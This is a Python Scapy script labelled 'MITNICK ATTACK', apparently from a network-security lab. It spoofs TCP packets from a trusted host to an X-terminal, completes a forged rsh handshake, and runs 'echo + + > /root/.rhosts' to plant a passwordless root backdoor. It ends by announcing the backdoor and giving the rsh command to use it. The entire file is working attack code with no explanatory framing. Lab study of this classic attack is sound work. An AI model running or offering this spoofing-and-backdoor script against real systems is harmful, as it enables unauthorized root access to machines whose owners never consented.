#!/usr/bin/python3
from scapy.all import *
import time

X_TERMINAL = "10.0.2.5"
TRUSTED_SERVER = "10.0.2.6"
RSH_PORT = 514
SRC_PORT = 1023
SECOND_PORT = 9090
COMMAND = "echo + + > /root/.rhosts"
ISN = 0x10000

first_done = False
second_done = False

def handle(pkt):
    global first_done, second_done
    if not pkt.haslayer(TCP): return
    ip, tcp = pkt[IP], pkt[TCP]
    if ip.src != X_TERMINAL: return
    
    print(f"[SNIFF] {ip.src}:{tcp.sport}->{ip.dst}:{tcp.dport} [{tcp.flags}]")
    
    if tcp.flags == "SA" and tcp.sport == RSH_PORT and not first_done:
        print("[+] Got SYN+ACK! Completing handshake + sending rsh...")
        # ACK
        send(IP(src=TRUSTED_SERVER,dst=X_TERMINAL)/TCP(sport=SRC_PORT,dport=RSH_PORT,flags="A",seq=ISN+1,ack=tcp.seq+1),verbose=0)
        # RSH data
        payload = f"{SECOND_PORT}\x00root\x00root\x00{COMMAND}\x00"
        send(IP(src=TRUSTED_SERVER,dst=X_TERMINAL)/TCP(sport=SRC_PORT,dport=RSH_PORT,flags="PA",seq=ISN+1,ack=tcp.seq+1)/Raw(load=payload),verbose=0)
        first_done = True
        
    elif tcp.flags == "S" and tcp.dport == SECOND_PORT and not second_done:
        print("[+] Got SYN for 2nd connection! Sending SYN+ACK...")
        send(IP(src=TRUSTED_SERVER,dst=X_TERMINAL)/TCP(sport=SECOND_PORT,dport=tcp.sport,flags="SA",seq=0x5000,ack=tcp.seq+1),verbose=0)
        second_done = True
        time.sleep(1)
        print("\n[SUCCESS] Backdoor planted! Run: rsh 10.0.2.5")

print("=== MITNICK ATTACK ===")
print("[*] Sending SYN...")
send(IP(src=TRUSTED_SERVER,dst=X_TERMINAL)/TCP(sport=SRC_PORT,dport=RSH_PORT,flags="S",seq=ISN),verbose=0)
print("[*] Sniffing...")
sniff(filter=f"tcp and src host {X_TERMINAL}", prn=handle, timeout=15)
